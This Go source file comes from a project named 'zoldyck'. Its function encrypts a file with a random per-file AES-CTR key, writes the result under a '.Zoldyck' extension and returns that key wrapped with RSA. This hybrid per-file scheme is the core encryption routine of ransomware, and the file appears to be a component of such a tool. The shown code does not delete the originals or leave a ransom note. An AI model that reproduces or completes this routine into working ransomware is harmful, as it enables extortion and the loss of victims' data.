package aes

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"io"
	"os"

	"github.com/savi2w/zoldyck/encrypt/rsa"
	"github.com/savi2w/zoldyck/encrypt/sha"
)

const EncryptExtension = ".Zoldyck"
const BufferSize = 4 * 1024

func File(loc string, r *rsa.RSA) (fileKey string, err error) {
	in, err := os.Open(loc)
	if err != nil {
		return "", err
	}

	defer in.Close()

	out, err := os.Create(loc + EncryptExtension)
	if err != nil {
		return "", err
	}

	defer out.Close()

	randomKey, err := sha.Random()
	if err != nil {
		return "", err
	}

	block, err := aes.NewCipher(randomKey)
	if err != nil {
		return "", err
	}

	nonce := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}

	if _, err := out.Write(nonce); err != nil {
		return "", err
	}

	buffer := make([]byte, BufferSize)
	stream := cipher.NewCTR(block, nonce)

	for {
		len, err := in.Read(buffer)
		if err != nil && err != io.EOF {
			return "", err
		}

		if len == 0 {
			break
		}

		cipher := make([]byte, len)

		stream.XORKeyStream(cipher, buffer[:len])

		if _, err := out.Write(cipher); err != nil {
			return "", err
		}
	}

	return r.Base64(randomKey)
}
